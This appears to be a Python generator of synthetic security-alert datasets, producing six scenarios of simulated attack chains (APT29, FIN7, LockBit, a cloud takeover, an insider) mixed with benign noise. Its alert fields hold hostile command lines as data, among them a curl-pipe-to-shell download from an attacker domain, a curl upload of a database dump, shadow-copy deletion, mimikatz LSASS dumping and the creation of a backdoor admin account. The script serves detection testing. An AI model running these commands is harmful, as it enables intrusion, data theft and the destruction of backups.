"""
ThreatLens Enterprise Multi-Scenario Dataset Generator
Generates 6 distinct production-grade datasets, each containing EXACTLY 3,000 alerts:
1. Multi-Attack Enterprise Storm (5 Simultaneous Attacks, Critical/High Risk)
2. Dual Targeted Intrusion (2 Attacks: FIN7 DB Exfil + Credential Stuffing, High/Medium Risk)
3. Stealth Insider Data Staging (1 Attack: Low-and-slow S3 data staging, Medium/Low Risk)
4. Clean Enterprise Telemetry Baseline (0 Attacks, 100% Benign Operational Noise)
5. Perimeter Scanner Storm + Fast Ransomware Outbreak (1 Critical Attack, 95% Deduplication)
6. Compliance Policy Violations & Shadow IT (2 Low-Risk Policy Violations, 0 APTs)

Outputs both JSON and CSV files for each scenario in the /datasets directory.
"""
import os
import sys
import json
import csv
import uuid
import random
from datetime import datetime, timedelta
from typing import List, Dict, Any

# Setup paths
DATASETS_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "datasets"))
os.makedirs(DATASETS_DIR, exist_ok=True)

CSV_FIELDNAMES = [
    "id", "timestamp", "source", "alert_type", "severity",
    "source_ip", "destination_ip", "source_user", "host",
    "process", "file_hash", "domain", "detection_rule",
    "raw_message", "mitre_technique_id", "mitre_technique_name",
    "mitre_tactic", "confidence", "is_anomalous", "anomaly_reasons"
]


def create_base_time():
    return datetime.utcnow() - timedelta(hours=3)


def generate_benign_noise_record(base_time: datetime, idx: int, custom_host: str = None) -> Dict[str, Any]:
    noise_templates = [
        {
            "source": "Windows Event Logs",
            "alert_type": "Scheduled Task Execution",
            "severity": "LOW",
            "host": custom_host or "CORP-DC-02",
            "user": "svc_backup",
            "process": "C:\\Windows\\System32\\wbadmin.exe",
            "rule": "Scheduled System State Archival (Event 4688)",
            "msg": "Routine scheduled differential backup completed successfully on cluster volume",
            "src_ip": "10.0.1.11",
            "dst_ip": "10.0.2.51"
        },
        {
            "source": "Firewall",
            "alert_type": "Internal Traffic Permitted",
            "severity": "LOW",
            "host": custom_host or "PROD-DB-PRIMARY",
            "user": "app_cluster_node",
            "process": "postgres.exe",
            "rule": "Authorized Internal Database Sync",
            "msg": "TCP port 5432 session established between authorized internal replica 10.0.2.51 and primary",
            "src_ip": "10.0.2.51",
            "dst_ip": "10.0.2.50"
        },
        {
            "source": "EDR",
            "alert_type": "IT Inventory Agent Telemetry",
            "severity": "LOW",
            "host": custom_host or "HR-TERMINAL-01",
            "user": "system",
            "process": "C:\\Program Files\\Tanium\\TaniumClient.exe",
            "rule": "Endpoint Asset Inventory Telemetry Query",
            "msg": "Periodic hardware sensor telemetry query collected for asset management database",
            "src_ip": "10.0.5.20",
            "dst_ip": "10.0.1.10"
        },
        {
            "source": "Authentication Systems",
            "alert_type": "Kerberos Ticket Granting Request",
            "severity": "LOW",
            "host": custom_host or "CORP-DC-01",
            "user": "m_torres",
            "process": "lsass.exe",
            "rule": "Normal TGT Ticket Renewal (Event 4768)",
            "msg": "Kerberos TGS renewal granted for corporate workstation login ticket within standard lease window",
            "src_ip": "10.0.5.95",
            "dst_ip": "10.0.1.10"
        },
        {
            "source": "Network Monitoring",
            "alert_type": "DNS Query Resolution",
            "severity": "LOW",
            "host": custom_host or "DEV-WORKSTATION-12",
            "user": "dev_alex",
            "process": "chrome.exe",
            "rule": "Standard Cloud Service DNS Resolution",
            "msg": "Standard DNS resolution for outlook.office365.com returned authorized Microsoft IP",
            "src_ip": "10.0.5.110",
            "dst_ip": "10.0.1.1"
        }
    ]

    pat = random.choice(noise_templates)
    offset_seconds = random.randint(0, 10800)
    t = (base_time + timedelta(seconds=offset_seconds)).isoformat() + "Z"

    return {
        "id": f"alt-noise-{idx:05d}-{uuid.uuid4().hex[:6]}",
        "timestamp": t,
        "source": pat["source"],
        "alert_type": pat["alert_type"],
        "severity": pat["severity"],
        "source_ip": pat["src_ip"],
        "destination_ip": pat["dst_ip"],
        "source_user": pat["user"],
        "host": pat["host"],
        "process": pat["process"],
        "file_hash": "",
        "domain": "",
        "detection_rule": pat["rule"],
        "raw_message": pat["msg"],
        "mitre_technique_id": "",
        "mitre_technique_name": "",
        "mitre_tactic": "",
        "confidence": 0.70,
        "is_anomalous": False,
        "anomaly_reasons": []
    }


# ==============================================================================
# DATASET 1: Multi-Attack Enterprise Storm (5 Simultaneous Attacks, 3,000 Alerts)
# ==============================================================================
def generate_dataset_1() -> List[Dict[str, Any]]:
    base_time = create_base_time()
    alerts: List[Dict[str, Any]] = []

    # Attack 1: APT29 Spearphishing to LSASS Dump to CORP-DC-01
    apt29_stages = [
        ("EDR", "Initial Access", "T1566.001", "Spearphishing Attachment", "HIGH", "EXEC-LAPTOP-CEO", "10.0.5.88", "198.51.100.22", "ceo_m_vance", "outlook.exe -> excel.exe", "Spearphishing macro opened in Outlook invoking hidden cmd", "update-sync-telemetry.org", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
        ("Windows Event Logs", "Execution", "T1059.001", "PowerShell Execution", "HIGH", "EXEC-LAPTOP-CEO", "10.0.5.88", "198.51.100.22", "ceo_m_vance", "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=", "Event 4688: Encoded command line invocation retrieving payload from update-sync-telemetry.org", "update-sync-telemetry.org", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
        ("Authentication Systems", "Defense Evasion", "T1078", "Valid Accounts", "MEDIUM", "EXEC-LAPTOP-CEO", "10.0.5.88", "198.51.100.22", "ceo_m_vance", "svchost.exe", "OAuth token replay detected originating from untrusted autonomous system", "", ""),
        ("EDR", "Credential Access", "T1003.001", "OS Credential Dumping: LSASS Memory", "CRITICAL", "EXEC-LAPTOP-CEO", "10.0.5.88", "198.51.100.22", "ceo_m_vance", "mimikatz.exe (spoolsv.exe injection)", "ReadProcessMemory handle open against LSASS.exe by unsigned binary", "", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
        ("Firewall", "Lateral Movement", "T1021.002", "Remote Services: SMB Shares", "HIGH", "CORP-DC-01", "10.0.1.10", "10.0.5.88", "ceo_m_vance", "net.exe use \\\\CORP-DC-01\\C$", "Traffic match: TCP/445 high-frequency IPC$ administrative query", "", "")
    ]
    for stage_idx, s in enumerate(apt29_stages):
        t = (base_time + timedelta(minutes=stage_idx * 15)).isoformat() + "Z"
        rec = {
            "id": f"alt-apt29-{stage_idx}-{uuid.uuid4().hex[:6]}",
            "timestamp": t,
            "source": s[0],
            "alert_type": s[3],
            "severity": s[4],
            "host": s[5],
            "destination_ip": s[6],
            "source_ip": s[7],
            "source_user": s[8],
            "process": s[9],
            "detection_rule": f"Rule: {s[3]}",
            "raw_message": s[10],
            "domain": s[11],
            "file_hash": s[12],
            "mitre_tactic": s[1],
            "mitre_technique_id": s[2],
            "mitre_technique_name": s[3],
            "confidence": 0.95,
            "is_anomalous": False,
            "anomaly_reasons": []
        }
        alerts.append(rec)
        # Duplicate beacons/probes
        for _ in range(12):
            rep = dict(rec)
            rep["id"] = f"alt-apt29-rep-{uuid.uuid4().hex[:6]}"
            rep["timestamp"] = (base_time + timedelta(minutes=stage_idx * 15, seconds=random.randint(5, 90))).isoformat() + "Z"
            alerts.append(rep)

    # Attack 2: FIN7 SQL Injection & DB Exfiltration
    fin7_stages = [
        ("Application Logs", "Initial Access", "T1190", "Exploit Public-Facing Application", "CRITICAL", "PAYMENT-GW-01", "10.0.3.15", "203.0.113.88", "srv_payment_app", "node.exe /api/checkout", "UNION SELECT syntax detected in transaction verification parameter", "billing-gateway-api.com", "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4"),
        ("Linux Logs", "Persistence", "T1053.005", "Scheduled Task: Crontab Web Shell", "HIGH", "PAYMENT-GW-01", "10.0.3.15", "203.0.113.88", "srv_payment_app", "/bin/sh -c 'curl http://billing-gateway-api.com/sh.elf | sh'", "Crontab entry modified by www-data user account", "billing-gateway-api.com", "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4"),
        ("Network Monitoring", "Discovery", "T1046", "Network Service Discovery: DB Scan", "MEDIUM", "PROD-DB-PRIMARY", "10.0.2.50", "10.0.3.15", "srv_payment_app", "masscan_raw", "TCP SYN probe across subnet 10.0.2.0/24 port 5432 (PostgreSQL)", "", ""),
        ("Firewall", "Exfiltration", "T1567", "Exfiltration Over Web Service", "CRITICAL", "PROD-DB-PRIMARY", "10.0.2.50", "203.0.113.88", "srv_payment_app", "gzip -> curl -T dump.sql.gz", "4.2 GB transmitted to 203.0.113.88 over port 443 in 12 minutes", "", "")
    ]
    for stage_idx, s in enumerate(fin7_stages):
        t = (base_time + timedelta(minutes=20 + stage_idx * 15)).isoformat() + "Z"
        rec = {
            "id": f"alt-fin7-{stage_idx}-{uuid.uuid4().hex[:6]}",
            "timestamp": t,
            "source": s[0],
            "alert_type": s[3],
            "severity": s[4],
            "host": s[5],
            "destination_ip": s[6],
            "source_ip": s[7],
            "source_user": s[8],
            "process": s[9],
            "detection_rule": f"Rule: {s[3]}",
            "raw_message": s[10],
            "domain": s[11],
            "file_hash": s[12],
            "mitre_tactic": s[1],
            "mitre_technique_id": s[2],
            "mitre_technique_name": s[3],
            "confidence": 0.94,
            "is_anomalous": False,
            "anomaly_reasons": []
        }
        alerts.append(rec)
        for _ in range(10):
            rep = dict(rec)
            rep["id"] = f"alt-fin7-rep-{uuid.uuid4().hex[:6]}"
            rep["timestamp"] = (base_time + timedelta(minutes=20 + stage_idx * 15, seconds=random.randint(5, 90))).isoformat() + "Z"
            alerts.append(rep)

    # Attack 3: LockBit Ransomware Precursor
    lockbit_stages = [
        ("EDR", "Execution", "T1059.003", "Command Shell: Malicious npm Dropper", "MEDIUM", "DEV-WORKSTATION-12", "10.0.5.110", "194.26.29.112", "dev_alex", "npm install malicious-typosquat", "Post-install script spawned hidden cmd.exe invoking certutil", "dev-packages-mirror.org", "b2f5ff47436671b6e533d8dc3614845d80ceee8"),
        ("Windows Event Logs", "Persistence", "T1547.001", "Registry Run Keys / Startup Folder", "HIGH", "DEV-WORKSTATION-12", "10.0.5.110", "194.26.29.112", "dev_alex", "reg.exe add HKCU\\Software\\Microsoft\\Windows\\Run", "Event 4657: Registry value 'WindowsSyncAgent' created pointing to temp path", "", "b2f5ff47436671b6e533d8dc3614845d80ceee8"),
        ("EDR", "Impact", "T1490", "Inhibit System Recovery: VSS Purge", "HIGH", "DEV-WORKSTATION-12", "10.0.5.110", "194.26.29.112", "dev_alex", "vssadmin.exe delete shadows /all /quiet", "Ransomware precursor: Shadow copies purged via admin CLI", "", "")
    ]
    for stage_idx, s in enumerate(lockbit_stages):
        t = (base_time + timedelta(minutes=40 + stage_idx * 10)).isoformat() + "Z"
        rec = {
            "id": f"alt-lockbit-{stage_idx}-{uuid.uuid4().hex[:6]}",
            "timestamp": t,
            "source": s[0],
            "alert_type": s[3],
            "severity": s[4],
            "host": s[5],
            "destination_ip": s[6],
            "source_ip": s[7],
            "source_user": s[8],
            "process": s[9],
            "detection_rule": f"Rule: {s[3]}",
            "raw_message": s[10],
            "domain": s[11],
            "file_hash": s[12],
            "mitre_tactic": s[1],
            "mitre_technique_id": s[2],
            "mitre_technique_name": s[3],
            "confidence": 0.91,
            "is_anomalous": False,
            "anomaly_reasons": []
        }
        alerts.append(rec)
        for _ in range(8):
            rep = dict(rec)
            rep["id"] = f"alt-lockbit-rep-{uuid.uuid4().hex[:6]}"
            rep["timestamp"] = (base_time + timedelta(minutes=40 + stage_idx * 10, seconds=random.randint(5, 90))).isoformat() + "Z"
            alerts.append(rep)

    # Attack 4: Cloud Rogue Admin Intrusion
    cloud_stages = [
        ("Authentication Systems", "Initial Access", "T1078.004", "Valid Accounts: Tor Exit SSO", "HIGH", "AWS-IAM-GATEWAY", "10.0.1.250", "185.220.101.5", "admin_c_ford", "okta-auth-broker", "SSO login from verified Tor Exit Node AS4412 bypasses normal geofence", "", ""),
        ("Cloud Logs", "Privilege Escalation", "T1098", "Account Manipulation: AssumeRole FullAdmin", "CRITICAL", "AWS-IAM-GATEWAY", "10.0.1.250", "185.220.101.5", "admin_c_ford", "sts:AssumeRole", "AWS CloudTrail: Role elevated to OrganizationAccountAccessRole", "", ""),
        ("Cloud Logs", "Exfiltration", "T1537", "Transfer Data to Cloud Account: S3 Bulk Sync", "HIGH", "AWS-S3-ARCHIVE", "10.0.1.251", "185.220.101.5", "admin_c_ford", "aws s3 sync s3://prod-fin-records s3://external-vault", "S3 bulk copy operation triggered against 14,000 confidential files", "", "")
    ]
    for stage_idx, s in enumerate(cloud_stages):
        t = (base_time + timedelta(minutes=50 + stage_idx * 12)).isoformat() + "Z"
        rec = {
            "id": f"alt-cloud-{stage_idx}-{uuid.uuid4().hex[:6]}",
            "timestamp": t,
            "source": s[0],
            "alert_type": s[3],
            "severity": s[4],
            "host": s[5],
            "destination_ip": s[6],
            "source_ip": s[7],
            "source_user": s[8],
            "process": s[9],
            "detection_rule": f"Rule: {s[3]}",
            "raw_message": s[10],
            "domain": s[11],
            "file_hash": s[12],
            "mitre_tactic": s[1],
            "mitre_technique_id": s[2],
            "mitre_technique_name": s[3],
            "confidence": 0.93,
            "is_anomalous": False,
            "anomaly_reasons": []
        }
        alerts.append(rec)
        for _ in range(6):
            rep = dict(rec)
            rep["id"] = f"alt-cloud-rep-{uuid.uuid4().hex[:6]}"
            rep["timestamp"] = (base_time + timedelta(minutes=50 + stage_idx * 12, seconds=random.randint(5, 90))).isoformat() + "Z"
            alerts.append(rep)

    # Attack 5: Novel Zero-Day AppData Temp Masquerade
    novel_rec = {
        "id": f"alt-novel-001-{uuid.uuid4().hex[:6]}",
        "timestamp": (base_time + timedelta(minutes=85)).isoformat() + "Z",
        "source": "EDR",
        "alert_type": "Unsigned Binary Rare Execution Path",
        "severity": "HIGH",
        "host": "FIN-WORKSTATION-04",
        "destination_ip": "198.51.100.199",
        "source_ip": "10.0.5.92",
        "source_user": "finance_lead_carter",
        "process": "C:\\Users\\carter\\AppData\\Local\\Temp\\updater_x64.tmp",
        "detection_rule": "Behavioral Anomaly: Off-hours Rare Binary",
        "raw_message": "Process updater_x64.tmp executed outside business hours (02:14 AM) with raw socket handle to foreign unclassified IP",
        "domain": "",
        "file_hash": "d41d8cd98f00b204e9800998ecf8427e",
        "mitre_tactic": "Execution",
        "mitre_technique_id": "T1204",
        "mitre_technique_name": "User Execution: Malicious File",
        "confidence": 0.88,
        "is_anomalous": True,
        "anomaly_reasons": [
            "Off-hours execution (02:14 AM) divergent from 30-day user baseline",
            "Execution from non-standard temporary directory (AppData\\Local\\Temp)",
            "Process has no cryptographic signature and no historical enterprise prevalence"
        ]
    }
    alerts.append(novel_rec)
    for _ in range(5):
        rep = dict(novel_rec)
        rep["id"] = f"alt-novel-rep-{uuid.uuid4().hex[:6]}"
        rep["timestamp"] = (base_time + timedelta(minutes=85, seconds=random.randint(5, 60))).isoformat() + "Z"
        alerts.append(rep)

    # Fill remaining to exactly 3,000 with benign enterprise noise
    current_count = len(alerts)
    needed = 3000 - current_count
    for i in range(needed):
        alerts.append(generate_benign_noise_record(base_time, i))

    random.shuffle(alerts)
    return alerts


# ==============================================================================
# DATASET 2: Dual Targeted Intrusion (2 Attacks, High/Medium Risk, 3,000 Alerts)
# ==============================================================================
def generate_dataset_2() -> List[Dict[str, Any]]:
    base_time = create_base_time()
    alerts: List[Dict[str, Any]] = []

    # Attack A: FIN7 SQLi against Payment Gateway
    fin7_stages = [
        ("Application Logs", "Initial Access", "T1190", "Exploit Public-Facing Application", "CRITICAL", "PAYMENT-GW-01", "10.0.3.15", "203.0.113.88", "srv_payment_app", "node.exe /api/checkout", "UNION SELECT syntax detected in transaction verification parameter", "billing-gateway-api.com", "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4"),
        ("Linux Logs", "Persistence", "T1053.005", "Scheduled Task: Crontab Web Shell", "HIGH", "PAYMENT-GW-01", "10.0.3.15", "203.0.113.88", "srv_payment_app", "/bin/sh -c 'curl http://billing-gateway-api.com/sh.elf | sh'", "Crontab entry modified by www-data user account", "billing-gateway-api.com", "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4"),
        ("Firewall", "Exfiltration", "T1567", "Exfiltration Over Web Service", "CRITICAL", "PROD-DB-PRIMARY", "10.0.2.50", "203.0.113.88", "srv_payment_app", "gzip -> curl -T dump.sql.gz", "3.8 GB transmitted to 203.0.113.88 over port 443 in 15 minutes", "", "")
    ]
    for stage_idx, s in enumerate(fin7_stages):
        t = (base_time + timedelta(minutes=stage_idx * 20)).isoformat() + "Z"
        rec = {
            "id": f"alt-d2-fin7-{stage_idx}-{uuid.uuid4().hex[:6]}",
            "timestamp": t,
            "source": s[0],
            "alert_type": s[3],
            "severity": s[4],
            "host": s[5],
            "destination_ip": s[6],
            "source_ip": s[7],
            "source_user": s[8],
            "process": s[9],
            "detection_rule": f"Rule: {s[3]}",
            "raw_message": s[10],
            "domain": s[11],
            "file_hash": s[12],
            "mitre_tactic": s[1],
            "mitre_technique_id": s[2],
            "mitre_technique_name": s[3],
            "confidence": 0.94,
            "is_anomalous": False,
            "anomaly_reasons": []
        }
        alerts.append(rec)
        for _ in range(15):
            rep = dict(rec)
            rep["id"] = f"alt-d2-fin7-rep-{uuid.uuid4().hex[:6]}"
            rep["timestamp"] = (base_time + timedelta(minutes=stage_idx * 20, seconds=random.randint(5, 120))).isoformat() + "Z"
            alerts.append(rep)

    # Attack B: Automated Credential Stuffing & Admin Account Takeover
    cred_stages = [
        ("Authentication Systems", "Credential Access", "T1110.004", "Credential Stuffing", "MEDIUM", "CORP-DC-01", "10.0.1.10", "198.51.100.99", "admin_j_smith", "okta-auth", "450 failed logins across dictionary passwords in 3 minutes", "", ""),
        ("Authentication Systems", "Initial Access", "T1078.002", "Valid Accounts: Domain Admin Account Takeover", "HIGH", "CORP-DC-01", "10.0.1.10", "198.51.100.99", "admin_j_smith", "svchost.exe", "Successful interactive RDP logon following 450 prior failures", "", ""),
        ("Windows Event Logs", "Persistence", "T1136.001", "Create Account: Local Admin", "HIGH", "CORP-DC-01", "10.0.1.10", "198.51.100.99", "admin_j_smith", "net.exe user backdor_admin /add", "Event 4720: User Account Created: backdor_admin added to Administrators", "", "")
    ]
    for stage_idx, s in enumerate(cred_stages):
        t = (base_time + timedelta(minutes=45 + stage_idx * 15)).isoformat() + "Z"
        rec = {
            "id": f"alt-d2-cred-{stage_idx}-{uuid.uuid4().hex[:6]}",
            "timestamp": t,
            "source": s[0],
            "alert_type": s[3],
            "severity": s[4],
            "host": s[5],
            "destination_ip": s[6],
            "source_ip": s[7],
            "source_user": s[8],
            "process": s[9],
            "detection_rule": f"Rule: {s[3]}",
            "raw_message": s[10],
            "domain": s[11],
            "file_hash": s[12],
            "mitre_tactic": s[1],
            "mitre_technique_id": s[2],
            "mitre_technique_name": s[3],
            "confidence": 0.89,
            "is_anomalous": False,
            "anomaly_reasons": []
        }
        alerts.append(rec)
        for _ in range(12):
            rep = dict(rec)
            rep["id"] = f"alt-d2-cred-rep-{uuid.uuid4().hex[:6]}"
            rep["timestamp"] = (base_time + timedelta(minutes=45 + stage_idx * 15, seconds=random.randint(5, 120))).isoformat() + "Z"
            alerts.append(rep)

    # Fill remaining to exactly 3,000 with benign enterprise noise
    needed = 3000 - len(alerts)
    for i in range(needed):
        alerts.append(generate_benign_noise_record(base_time, i))

    random.shuffle(alerts)
    return alerts


# ==============================================================================
# DATASET 3: Stealth Insider Data Staging (1 Attack, Medium/Low Risk, 3,000 Alerts)
# ==============================================================================
def generate_dataset_3() -> List[Dict[str, Any]]:
    base_time = create_base_time()
    alerts: List[Dict[str, Any]] = []

    # 1 Stealthy low-and-slow insider attack by authorized analyst
    insider_stages = [
        ("Cloud Logs", "Collection", "T1530", "Data from Cloud Storage Object: Off-Hours S3 Access", "MEDIUM", "FIN-WORKSTATION-04", "10.0.5.92", "10.0.5.92", "analyst_marcus", "aws s3 cp", "Off-hours download of 12 internal customer financial records from s3://confidential-ledger", "", ""),
        ("EDR", "Collection", "T1560.001", "Archive Collected Data: Archive via Utility", "LOW", "FIN-WORKSTATION-04", "10.0.5.92", "10.0.5.92", "analyst_marcus", "7z.exe a -p secret.7z *.xlsx", "Command line 7z invocation creating password-protected archive in local temp directory", "", "7b5832a8a1023c5d6480b59b2dc327aa4"),
        ("Network Monitoring", "Exfiltration", "T1567.002", "Exfiltration to Cloud Storage", "MEDIUM", "FIN-WORKSTATION-04", "10.0.5.92", "198.51.100.210", "analyst_marcus", "curl.exe -X POST https://temp-storage-drop.io/upload", "Outbound HTTPS upload of 420 MB to unclassified cloud file locker during non-business hours", "temp-storage-drop.io", "")
    ]
    for stage_idx, s in enumerate(insider_stages):
        t = (base_time + timedelta(minutes=stage_idx * 30)).isoformat() + "Z"
        rec = {
            "id": f"alt-d3-insider-{stage_idx}-{uuid.uuid4().hex[:6]}",
            "timestamp": t,
            "source": s[0],
            "alert_type": s[3],
            "severity": s[4],
            "host": s[5],
            "destination_ip": s[6],
            "source_ip": s[7],
            "source_user": s[8],
            "process": s[9],
            "detection_rule": f"Rule: {s[3]}",
            "raw_message": s[10],
            "domain": s[11],
            "file_hash": s[12],
            "mitre_tactic": s[1],
            "mitre_technique_id": s[2],
            "mitre_technique_name": s[3],
            "confidence": 0.82,
            "is_anomalous": True,
            "anomaly_reasons": [
                "Off-hours access (03:42 AM) divergent from standard analyst schedule",
                "Password-encrypted archive creation on local endpoint"
            ]
        }
        alerts.append(rec)
        for _ in range(6):
            rep = dict(rec)
            rep["id"] = f"alt-d3-insider-rep-{uuid.uuid4().hex[:6]}"
            rep["timestamp"] = (base_time + timedelta(minutes=stage_idx * 30, seconds=random.randint(10, 180))).isoformat() + "Z"
            alerts.append(rep)

    # Fill remaining to exactly 3,000 with benign enterprise noise
    needed = 3000 - len(alerts)
    for i in range(needed):
        alerts.append(generate_benign_noise_record(base_time, i))

    random.shuffle(alerts)
    return alerts


# ==============================================================================
# DATASET 4: Clean Enterprise Telemetry Baseline (0 Attacks, 3,000 Alerts)
# ==============================================================================
def generate_dataset_4() -> List[Dict[str, Any]]:
    base_time = create_base_time()
    alerts: List[Dict[str, Any]] = []

    # 100% benign operational telemetry - 3,000 records, exactly 0 attacks!
    for i in range(3000):
        alerts.append(generate_benign_noise_record(base_time, i))

    return alerts


# ==============================================================================
# DATASET 5: Perimeter Scanner Noise Storm + Fast Ransomware Outbreak (3,000 Alerts)
# ==============================================================================
def generate_dataset_5() -> List[Dict[str, Any]]:
    base_time = create_base_time()
    alerts: List[Dict[str, Any]] = []

    # Attack: 1 Fast LockBit Outbreak
    ransom_stages = [
        ("EDR", "Execution", "T1059.003", "Command Shell: Ransomware Payload Invocation", "HIGH", "DEV-WORKSTATION-12", "10.0.5.110", "194.26.29.112", "dev_alex", "powershell.exe -w hidden -enc JABk...", "Encoded PowerShell script dropped lockbit.exe onto developer machine", "ransom-c2-vault.org", "c4ca4238a0b923820dcc509a6f75849b"),
        ("EDR", "Impact", "T1490", "Inhibit System Recovery: Volume Shadow Copy Deletion", "CRITICAL", "DEV-WORKSTATION-12", "10.0.5.110", "194.26.29.112", "dev_alex", "vssadmin.exe delete shadows /all /quiet", "VSSADMIN invoked with /quiet parameter to purge all local shadow restore points", "", ""),
        ("Firewall", "Lateral Movement", "T1021.002", "SMB Admin Share Lateral Spray", "CRITICAL", "CORP-DC-01", "10.0.1.10", "10.0.5.110", "dev_alex", "psexec.exe \\\\CORP-DC-01 -u admin -p ...", "High frequency SMB connections across subnet 10.0.1.0/24 targeting C$ admin shares", "", "")
    ]
    for stage_idx, s in enumerate(ransom_stages):
        t = (base_time + timedelta(minutes=15 + stage_idx * 10)).isoformat() + "Z"
        rec = {
            "id": f"alt-d5-ransom-{stage_idx}-{uuid.uuid4().hex[:6]}",
            "timestamp": t,
            "source": s[0],
            "alert_type": s[3],
            "severity": s[4],
            "host": s[5],
            "destination_ip": s[6],
            "source_ip": s[7],
            "source_user": s[8],
            "process": s[9],
            "detection_rule": f"Rule: {s[3]}",
            "raw_message": s[10],
            "domain": s[11],
            "file_hash": s[12],
            "mitre_tactic": s[1],
            "mitre_technique_id": s[2],
            "mitre_technique_name": s[3],
            "confidence": 0.96,
            "is_anomalous": False,
            "anomaly_reasons": []
        }
        alerts.append(rec)
        for _ in range(15):
            rep = dict(rec)
            rep["id"] = f"alt-d5-ransom-rep-{uuid.uuid4().hex[:6]}"
            rep["timestamp"] = (base_time + timedelta(minutes=15 + stage_idx * 10, seconds=random.randint(5, 60))).isoformat() + "Z"
            alerts.append(rep)

    # Perimeter scanner storm: 2,850 repetitive vulnerability scan events
    needed = 3000 - len(alerts)
    for i in range(needed):
        t_rand = (base_time + timedelta(seconds=random.randint(0, 7200))).isoformat() + "Z"
        scan_rec = {
            "id": f"alt-d5-scan-{i:05d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t_rand,
            "source": "Firewall",
            "alert_type": "Perimeter Port Probe Denied",
            "severity": "LOW",
            "host": "EDGE-FW-01",
            "source_ip": "10.0.4.101" if i % 2 == 0 else "198.51.100.44",
            "destination_ip": f"10.0.5.{random.randint(10, 150)}",
            "source_user": "scanner_service",
            "process": "nessus_scan_worker.exe",
            "detection_rule": "Vulnerability Scanner Sweep (Authorized Internal / Perimeter Drop)",
            "raw_message": f"TCP port {random.choice([80, 443, 22, 3389, 8080, 8443])} probe blocked by firewall access control rule 104",
            "domain": "",
            "file_hash": "",
            "mitre_technique_id": "",
            "mitre_technique_name": "",
            "mitre_tactic": "",
            "confidence": 0.75,
            "is_anomalous": False,
            "anomaly_reasons": []
        }
        alerts.append(scan_rec)

    random.shuffle(alerts)
    return alerts


# ==============================================================================
# DATASET 6: Compliance Policy Violations & Shadow IT (Low Risk, 3,000 Alerts)
# ==============================================================================
def generate_dataset_6() -> List[Dict[str, Any]]:
    base_time = create_base_time()
    alerts: List[Dict[str, Any]] = []

    # Policy Violation 1: BitTorrent P2P Traffic on HR Terminal
    p2p_rec = {
        "id": f"alt-d6-p2p-{uuid.uuid4().hex[:6]}",
        "timestamp": (base_time + timedelta(minutes=25)).isoformat() + "Z",
        "source": "EDR",
        "alert_type": "Unauthorized Peer-to-Peer Application",
        "severity": "LOW",
        "host": "HR-TERMINAL-01",
        "destination_ip": "185.120.44.12",
        "source_ip": "10.0.5.20",
        "source_user": "hr_recruiter_tina",
        "process": "C:\\Users\\tina\\AppData\\Local\\uTorrent\\uTorrent.exe",
        "detection_rule": "Acceptable Use Policy Violation: P2P Software",
        "raw_message": "Process uTorrent.exe established 48 UDP sessions across non-standard port range 6881-6889",
        "domain": "tracker.openbittorrent.com",
        "file_hash": "e99a18c428cb38d5f260853678922e03",
        "mitre_tactic": "",
        "mitre_technique_id": "",
        "mitre_technique_name": "",
        "confidence": 0.85,
        "is_anomalous": True,
        "anomaly_reasons": [
            "Corporate software policy violation: Unapproved P2P software",
            "Anomalous high UDP socket bind volume on workstation"
        ]
    }
    alerts.append(p2p_rec)
    for _ in range(8):
        rep = dict(p2p_rec)
        rep["id"] = f"alt-d6-p2p-rep-{uuid.uuid4().hex[:6]}"
        rep["timestamp"] = (base_time + timedelta(minutes=25, seconds=random.randint(10, 120))).isoformat() + "Z"
        alerts.append(rep)

    # Policy Violation 2: Unapproved Personal Cloud Storage Upload (Dropbox)
    dropbox_rec = {
        "id": f"alt-d6-cloud-{uuid.uuid4().hex[:6]}",
        "timestamp": (base_time + timedelta(minutes=55)).isoformat() + "Z",
        "source": "Network Monitoring",
        "alert_type": "Shadow IT: Personal Cloud Storage Upload",
        "severity": "LOW",
        "host": "DEV-WORKSTATION-12",
        "destination_ip": "162.125.18.133",
        "source_ip": "10.0.5.110",
        "source_user": "dev_alex",
        "process": "Dropbox.exe",
        "detection_rule": "Data Governance Violation: Unsanctioned Cloud Sync",
        "raw_message": "Dropbox client synchronized 620 MB of local workspace files to external unmanaged tenant",
        "domain": "dropbox.com",
        "file_hash": "",
        "mitre_tactic": "",
        "mitre_technique_id": "",
        "mitre_technique_name": "",
        "confidence": 0.82,
        "is_anomalous": True,
        "anomaly_reasons": [
            "Shadow IT application usage: Unapproved personal cloud backup",
            "Egress to unmanaged cloud tenancy"
        ]
    }
    alerts.append(dropbox_rec)
    for _ in range(6):
        rep = dict(dropbox_rec)
        rep["id"] = f"alt-d6-cloud-rep-{uuid.uuid4().hex[:6]}"
        rep["timestamp"] = (base_time + timedelta(minutes=55, seconds=random.randint(10, 120))).isoformat() + "Z"
        alerts.append(rep)

    # Fill remaining to exactly 3,000 with benign enterprise noise
    needed = 3000 - len(alerts)
    for i in range(needed):
        alerts.append(generate_benign_noise_record(base_time, i))

    random.shuffle(alerts)
    return alerts


# ==============================================================================
# WRITING & VERIFICATION
# ==============================================================================
def save_dataset(filename_stem: str, records: List[Dict[str, Any]]):
    json_path = os.path.join(DATASETS_DIR, f"{filename_stem}.json")
    csv_path = os.path.join(DATASETS_DIR, f"{filename_stem}.csv")

    # Save JSON
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=2)

    # Save CSV
    with open(csv_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=CSV_FIELDNAMES, extrasaction="ignore")
        writer.writeheader()
        for r in records:
            # Flatten anomaly_reasons list for CSV
            r_copy = dict(r)
            if isinstance(r_copy.get("anomaly_reasons"), list):
                r_copy["anomaly_reasons"] = "; ".join(r_copy["anomaly_reasons"])
            writer.writerow(r_copy)

    # Verify counts
    with open(csv_path, "r", encoding="utf-8") as f:
        csv_rows = sum(1 for _ in f) - 1

